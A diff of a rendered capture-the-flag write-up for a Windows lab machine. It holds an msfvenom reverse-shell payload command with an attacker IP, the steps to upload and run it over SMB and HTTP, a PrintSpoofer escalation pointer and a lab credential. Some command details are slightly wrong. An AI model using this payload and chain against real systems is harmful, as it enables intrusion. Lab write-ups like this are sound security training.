@@ -277,7 +277,7 @@ Bill - Juw4nnaM4n420696969!<span class="nv">$$$ </span>
 <div class="highlight"><pre class="highlight shell"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.9.186.16 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> aspw <span class="nt">-o</span> hacky.aspx
 </code></pre></div>
 
-<p>We then upload <code>hacky.aspx</code> to the nt4wrksv share with <code>get hacky.aspx</code> in SMB and execute the payload through HTTP (http://:49663/nt4wrksv/hacky.aspx), instantly granting us a shell to our target and access to the output of <code>User.txt</code>.</p>
+<p>We then upload <code>hacky.aspx</code> to the nt4wrksv share with <code>get hacky.aspx</code> in SMB and execute the payload through HTTP (<a href="http://TARGET-IP:49663/nt4wrksv/hacky.aspx" rel="nofollow">http://TARGET-IP:49663/nt4wrksv/hacky.aspx</a>), instantly granting us a shell to our target and access to the output of <code>User.txt</code>.</p>
 
 <p>Enumerating privileges on our current user instantly shows us how we will escalate our privileges to <code>SYSTEM</code>, since having <code>SeImpersonatePrivilege</code> enabled instantly makes this box vulnerable to PrintSpoofer64 (<a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):" rel="nofollow">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):</a></p>
 
